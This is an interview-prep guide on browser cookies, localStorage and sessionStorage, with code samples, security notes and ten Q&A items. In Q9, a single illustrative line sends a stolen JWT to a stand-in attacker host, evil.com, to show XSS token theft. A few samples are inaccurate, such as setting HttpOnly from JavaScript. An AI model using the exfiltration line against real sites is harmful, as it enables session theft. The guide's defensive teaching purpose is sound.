# 🍪 Browser Storage: Cookies vs localStorage vs sessionStorage

> Interview guide covering browser storage mechanisms

## Table of Contents

- [Quick Comparison](#quick-comparison)
- [Cookies](#cookies)
- [localStorage](#localstorage)
- [sessionStorage](#sessionstorage)
- [When to Use What](#when-to-use-what)
- [Interview Questions](#interview-questions)

---

## Quick Comparison

| Feature | Cookies | localStorage | sessionStorage |
|---------|---------|--------------|----------------|
| **Capacity** | ~4KB | ~5-10MB | ~5-10MB |
| **Accessible from** | Server & Client | Client only | Client only |
| **Sent with requests** | ✅ Yes (automatically) | ❌ No | ❌ No |
| **Expiration** | Manual (set expires/max-age) | Never | On tab close |
| **Scope** | Domain & path | Domain & protocol | Domain, protocol & tab |
| **API** | `document.cookie` (string) | `localStorage` (object) | `sessionStorage` (object) |
| **Storage location** | Browser & Server | Browser only | Browser only |
| **Security** | Can set HttpOnly, Secure, SameSite | JavaScript accessible | JavaScript accessible |

---

## Cookies

### What Are Cookies?

Small text files stored by the browser, sent with **every HTTP request** to the same domain.

### Setting Cookies

```javascript
// JavaScript
document.cookie = "username=John";
document.cookie = "theme=dark; max-age=3600"; // Expires in 1 hour
document.cookie = "token=abc123; secure; httponly"; // HTTPS only, not accessible via JS

// Server-side (HTTP Header)
Set-Cookie: sessionId=abc123; Path=/; Expires=Wed, 09 Jun 2025 10:18:14 GMT
Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict
```

### Reading Cookies

```javascript
// Returns all cookies as a single string
console.log(document.cookie);
// "username=John; theme=dark; sessionId=abc123"

// Parse cookies
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

console.log(getCookie('username')); // "John"
```

### Deleting Cookies

```javascript
// Set expiration to past date
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";

// Or set max-age to 0
document.cookie = "username=; max-age=0; path=/";
```

### Cookie Attributes

```javascript
document.cookie = "name=value; " +
  "expires=Wed, 09 Jun 2025 10:18:14 GMT; " + // Expiration date
  "max-age=3600; " +                           // Expires in seconds
  "path=/; " +                                 // Available on all paths
  "domain=example.com; " +                     // Available on domain & subdomains
  "secure; " +                                 // HTTPS only
  "samesite=strict";                           // CSRF protection

/*
Attributes:
- expires: Absolute expiration date
- max-age: Relative expiration in seconds (overrides expires)
- path: URL path where cookie is valid (default: current path)
- domain: Domain where cookie is valid
- secure: Only sent over HTTPS
- httponly: Not accessible via JavaScript (server-only)
- samesite: Controls cross-site requests
  - Strict: Never sent with cross-site requests
  - Lax: Sent with top-level navigation
  - None: Always sent (requires Secure)
*/
```

### Cookie Use Cases

```javascript
// 1. Authentication token
document.cookie = "authToken=abc123; secure; httponly; samesite=strict";

// 2. User preferences
document.cookie = "theme=dark; max-age=31536000"; // 1 year

// 3. Tracking & Analytics
document.cookie = "userId=12345; max-age=31536000; path=/";

// 4. Session management
document.cookie = "sessionId=xyz789; path=/";
```

### Cookie Limitations

```javascript
// Size limit
const largeCookie = "x".repeat(5000);
document.cookie = `large=${largeCookie}`; // May fail or truncate

// Number limit (varies by browser)
// Chrome: ~180 cookies per domain
// Total: ~3000 cookies

// Performance issue: Sent with EVERY request
// If you have 4KB of cookies, every request adds 4KB
fetch('/api/data'); // Cookies automatically attached → slower requests
```

---

## localStorage

### What is localStorage?

Persistent storage that survives browser restarts. Data never expires unless explicitly deleted.

### Basic Operations

```javascript
// Set item
localStorage.setItem('username', 'John');
localStorage.setItem('theme', 'dark');

// Get item
const username = localStorage.getItem('username'); // "John"
const theme = localStorage.getItem('theme'); // "dark"

// Remove item
localStorage.removeItem('username');

// Clear all
localStorage.clear();

// Check if key exists
if (localStorage.getItem('theme') !== null) {
  console.log('Theme is set');
}

// Get number of items
console.log(localStorage.length); // 1

// Get key by index
console.log(localStorage.key(0)); // "theme"
```

### Storing Complex Data

```javascript
// localStorage only stores strings
// Must serialize objects

// Storing object
const user = { name: 'John', age: 30, role: 'admin' };
localStorage.setItem('user', JSON.stringify(user));

// Retrieving object
const userData = JSON.parse(localStorage.getItem('user'));
console.log(userData.name); // "John"

// Storing array
const todos = ['Buy milk', 'Write code', 'Sleep'];
localStorage.setItem('todos', JSON.stringify(todos));

// Retrieving array
const todoList = JSON.parse(localStorage.getItem('todos'));
console.log(todoList[0]); // "Buy milk"

// Error handling
try {
  const data = JSON.parse(localStorage.getItem('settings'));
} catch (e) {
  console.error('Invalid JSON in localStorage');
}
```

### localStorage Helper Wrapper

```javascript
const storage = {
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.error('localStorage quota exceeded');
      }
    }
  },
  
  get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (e) {
      return defaultValue;
    }
  },
  
  remove(key) {
    localStorage.removeItem(key);
  },
  
  clear() {
    localStorage.clear();
  }
};

// Usage
storage.set('user', { name: 'John', age: 30 });
const user = storage.get('user'); // { name: 'John', age: 30 }
```

### localStorage Events

```javascript
// Listen for storage changes (fires on OTHER tabs/windows)
window.addEventListener('storage', (e) => {
  console.log('Key:', e.key);          // Changed key
  console.log('Old value:', e.oldValue); // Previous value
  console.log('New value:', e.newValue); // New value
  console.log('URL:', e.url);          // Page URL where change occurred
  console.log('Storage:', e.storageArea); // localStorage or sessionStorage
});

// Use case: Sync state across tabs
// Tab 1:
localStorage.setItem('theme', 'dark');

// Tab 2: (automatically receives event)
window.addEventListener('storage', (e) => {
  if (e.key === 'theme') {
    applyTheme(e.newValue);
  }
});
```

### Quota Management

```javascript
// Check available space (not standardized)
function getLocalStorageSize() {
  let total = 0;
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      total += localStorage[key].length + key.length;
    }
  }
  return total;
}

// Handle quota exceeded
try {
  localStorage.setItem('largeData', hugeString);
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    // Clear old data or notify user
    localStorage.clear();
    console.error('Storage quota exceeded');
  }
}
```

---

## sessionStorage

### What is sessionStorage?

Temporary storage that's cleared when the **page session ends** (tab/window closes).

### Basic Operations

```javascript
// Same API as localStorage
sessionStorage.setItem('tempData', 'value');
const data = sessionStorage.getItem('tempData');
sessionStorage.removeItem('tempData');
sessionStorage.clear();
```

### Key Differences from localStorage

```javascript
// 1. Scope: Per tab/window
// Tab 1:
sessionStorage.setItem('count', '1');

// Tab 2 (same URL):
console.log(sessionStorage.getItem('count')); // null (different session)

// 2. Lifetime: Until tab closes
sessionStorage.setItem('data', 'value');
// Close tab → data is gone
// Refresh page → data persists
// Open new tab with same URL → new session, no data

// 3. No cross-tab communication
window.addEventListener('storage', (e) => {
  // This event does NOT fire for sessionStorage changes
  // in other tabs (only localStorage)
});
```

### sessionStorage Use Cases

```javascript
// 1. Multi-step form (wizard)
// Step 1
sessionStorage.setItem('formStep1', JSON.stringify({
  name: 'John',
  email: 'john@example.com'
}));

// Step 2
const step1Data = JSON.parse(sessionStorage.getItem('formStep1'));
// Continue with form...

// 2. Temporary authentication state
sessionStorage.setItem('isLoggedIn', 'true');

// 3. Draft/unsaved changes
sessionStorage.setItem('draft', editorContent);

// 4. Shopping cart (temporary)
const cart = JSON.parse(sessionStorage.getItem('cart')) || [];
cart.push(newItem);
sessionStorage.setItem('cart', JSON.stringify(cart));
```

### Page Lifecycle

```javascript
// Survives page refresh
window.addEventListener('beforeunload', () => {
  sessionStorage.setItem('scrollPosition', window.scrollY);
});

window.addEventListener('load', () => {
  const scrollPos = sessionStorage.getItem('scrollPosition');
  if (scrollPos) {
    window.scrollTo(0, parseInt(scrollPos));
  }
});

// Cleared on tab close
window.addEventListener('unload', () => {
  // sessionStorage automatically cleared
  // No need for manual cleanup
});
```

---

## When to Use What

### Decision Tree

```
Need to send data to server with each request?
├─ YES → Cookies
└─ NO → Web Storage
    │
    Need data after browser closes?
    ├─ YES → localStorage
    └─ NO → sessionStorage
        │
        Need data across tabs?
        ├─ YES → localStorage
        └─ NO → sessionStorage
```

### Use Cases

**Cookies:**
- Authentication tokens (session management)
- User tracking & analytics
- Server needs to read the data
- Cross-domain scenarios (with proper settings)
- Small data that must be sent with requests

**localStorage:**
- User preferences (theme, language)
- Cached data for offline use
- Shopping cart (persistent)
- Saved game progress
- Draft content (long-term)
- Application state across sessions
- Sync data across tabs

**sessionStorage:**
- Multi-step forms (wizard state)
- Temporary authentication state
- Single-page app state (per tab)
- Draft content (short-term)
- Shopping cart (session-only)
- Scroll position restoration

---

## Security Considerations

### XSS Vulnerabilities

```javascript
// ❌ Vulnerable to XSS
localStorage.setItem('userInput', untrustedData);
document.innerHTML = localStorage.getItem('userInput'); // XSS!

// ✅ Sanitize before use
const sanitized = DOMPurify.sanitize(localStorage.getItem('userInput'));
document.innerHTML = sanitized;

// ✅ Better: Use textContent
document.textContent = localStorage.getItem('userInput');
```

### Sensitive Data

```javascript
// ❌ Never store sensitive data in localStorage/sessionStorage
localStorage.setItem('password', userPassword); // BAD!
localStorage.setItem('creditCard', cardNumber); // BAD!
localStorage.setItem('ssn', socialSecurity); // BAD!

// ✅ Use HttpOnly cookies for sensitive data
// Server-side:
// Set-Cookie: authToken=xyz; HttpOnly; Secure; SameSite=Strict

// JavaScript cannot access HttpOnly cookies
console.log(document.cookie); // authToken won't appear
```

### Cookie Security

```javascript
// ❌ Insecure cookie
document.cookie = "authToken=abc123";

// ✅ Secure cookie (server-side)
// Set-Cookie: authToken=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

/*
Security flags:
- HttpOnly: Prevents JavaScript access (XSS protection)
- Secure: Only sent over HTTPS (prevents MITM)
- SameSite: Prevents CSRF attacks
  - Strict: Never sent with cross-site requests
  - Lax: Sent with top-level navigation only
  - None: Always sent (requires Secure flag)
*/
```

---

## Interview Questions

### Q1: What's the main difference between cookies and Web Storage?

**Answer:**

**Cookies:**
- Sent with every HTTP request (automatic)
- ~4KB limit
- Accessible from server and client
- Has expiration
- Useful for server-side authentication

**Web Storage (localStorage/sessionStorage):**
- NOT sent with requests (client-only)
- ~5-10MB limit
- Client-side only
- Simple API
- Better performance (no network overhead)

---

### Q2: When would you use sessionStorage over localStorage?

**Answer:**

Use **sessionStorage** when:
- Data should not persist after tab closes
- Data is tab-specific (different tabs need different data)
- Temporary state (multi-step forms, temporary auth)
- Privacy-sensitive temporary data

Use **localStorage** when:
- Data should persist across sessions
- Data needs to sync across tabs
- Long-term user preferences
- Offline app data

**Example:**
```javascript
// sessionStorage: Form wizard
sessionStorage.setItem('formStep', '2');

// localStorage: User theme
localStorage.setItem('theme', 'dark');
```

---

### Q3: How do you handle storage quota exceeded errors?

**Answer:**

```javascript
function safeSetItem(key, value, storage = localStorage) {
  try {
    storage.setItem(key, JSON.stringify(value));
    return true;
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      // Strategy 1: Clear old data
      storage.clear();
      
      // Strategy 2: Remove oldest items (LRU)
      const keys = Object.keys(storage);
      if (keys.length > 0) {
        storage.removeItem(keys[0]);
      }
      
      // Strategy 3: Notify user
      alert('Storage full. Please clear some data.');
      
      return false;
    }
    throw e;
  }
}
```

---

### Q4: How can you sync data across multiple tabs?

**Answer:**

Use **localStorage** with storage event:

```javascript
// Tab 1: Update data
localStorage.setItem('count', '5');

// Tab 2: Listen for changes
window.addEventListener('storage', (e) => {
  if (e.key === 'count') {
    console.log('Count updated to:', e.newValue);
    updateUI(e.newValue);
  }
});

// Note: Event fires only on OTHER tabs, not the one making the change
```

---

### Q5: What's the output?

```javascript
// Tab 1
localStorage.setItem('user', 'Alice');
sessionStorage.setItem('user', 'Bob');

// Tab 2 (same domain)
console.log(localStorage.getItem('user'));
console.log(sessionStorage.getItem('user'));
```

**Answer:**
```
'Alice'
null
```

**Explanation:**
- localStorage is shared across all tabs
- sessionStorage is per-tab (new tab = new session)

---

### Q6: Cookie attributes question:

```javascript
document.cookie = "token=abc; secure; samesite=strict";

// Can this cookie be:
// 1. Read via JavaScript?
// 2. Sent over HTTP?
// 3. Sent with cross-site requests?
```

**Answer:**

1. **Read via JavaScript?** ✅ Yes (no HttpOnly flag)
2. **Sent over HTTP?** ❌ No (Secure flag = HTTPS only)
3. **Sent with cross-site requests?** ❌ No (SameSite=Strict)

---

### Q7: How do you delete all localStorage items with a prefix?

**Answer:**

```javascript
function clearWithPrefix(prefix) {
  const keysToRemove = [];
  
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key.startsWith(prefix)) {
      keysToRemove.push(key);
    }
  }
  
  keysToRemove.forEach(key => localStorage.removeItem(key));
}

// Usage
localStorage.setItem('user:1', 'Alice');
localStorage.setItem('user:2', 'Bob');
localStorage.setItem('settings:theme', 'dark');

clearWithPrefix('user:'); // Removes only user:1 and user:2
```

---

### Q8: What happens to sessionStorage when you duplicate a tab?

**Answer:**

When you **duplicate a tab** (e.g., right-click → Duplicate):
- sessionStorage is **COPIED** to the new tab
- After duplication, they're independent sessions

```javascript
// Original tab
sessionStorage.setItem('data', 'original');

// Duplicate tab (right after duplication)
console.log(sessionStorage.getItem('data')); // 'original' ✅

// Modify in duplicate tab
sessionStorage.setItem('data', 'modified');

// Original tab
console.log(sessionStorage.getItem('data')); // Still 'original'
```

When you **open a new tab** (Ctrl+T):
- sessionStorage is **EMPTY** (new session)

---

### Q9: Why shouldn't you store JWT tokens in localStorage?

**Answer:**

**Security risks:**

1. **XSS vulnerability** - Any JavaScript can access localStorage
```javascript
// If attacker injects malicious script:
const token = localStorage.getItem('jwt');
fetch('https://evil.com/steal?token=' + token);
```

2. **No HttpOnly protection** - Cannot prevent JavaScript access

**Better approach:**

```javascript
// Store in HttpOnly cookie (server-side)
// Set-Cookie: jwt=token; HttpOnly; Secure; SameSite=Strict

// OR use in-memory storage (lost on refresh)
let authToken = null;

function login(token) {
  authToken = token;
  // Store in sessionStorage as backup (still risky)
  sessionStorage.setItem('token', token);
}
```

---

### Q10: How do you implement expiring data in localStorage?

**Answer:**

```javascript
const storage = {
  set(key, value, ttl) {
    const item = {
      value: value,
      expiry: Date.now() + ttl
    };
    localStorage.setItem(key, JSON.stringify(item));
  },
  
  get(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;
    
    const item = JSON.parse(itemStr);
    
    // Check if expired
    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return null;
    }
    
    return item.value;
  }
};

// Usage
storage.set('token', 'abc123', 3600000); // Expires in 1 hour
const token = storage.get('token');
```

---

## Browser Support & Limitations

### Storage Limits

```javascript
// Approximate limits (varies by browser)
const limits = {
  cookies: '4KB per cookie, ~50-180 cookies per domain',
  localStorage: '5-10MB total',
  sessionStorage: '5-10MB total'
};

// Test localStorage size
function getStorageSize() {
  let size = 0;
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      size += key.length + localStorage[key].length;
    }
  }
  return (size / 1024).toFixed(2) + ' KB';
}
```

### Feature Detection

```javascript
// Check if storage is available
function isStorageAvailable(type) {
  try {
    const storage = window[type];
    const test = '__storage_test__';
    storage.setItem(test, test);
    storage.removeItem(test);
    return true;
  } catch (e) {
    return false;
  }
}

if (isStorageAvailable('localStorage')) {
  // Use localStorage
} else {
  // Fallback to cookies or in-memory storage
}

// Check if cookies are enabled
function areCookiesEnabled() {
  try {
    document.cookie = 'test=1';
    const enabled = document.cookie.indexOf('test=') !== -1;
    document.cookie = 'test=; expires=Thu, 01 Jan 1970 00:00:00 UTC';
    return enabled;
  } catch (e) {
    return false;
  }
}
```

---

## Summary Cheat Sheet

| Need | Solution |
|------|----------|
| Authentication | HttpOnly Cookies |
| User preferences | localStorage |
| Theme/language | localStorage |
| Temporary form data | sessionStorage |
| Multi-step wizard | sessionStorage |
| Shopping cart (persistent) | localStorage |
| Shopping cart (session) | sessionStorage |
| Tracking/analytics | Cookies |
| CSRF token | Cookies (SameSite) |
| Large data storage | IndexedDB (not covered) |
| Offline data | localStorage + Service Worker |
| Cross-tab sync | localStorage + storage event |

---


## Resources

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [OWASP: HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
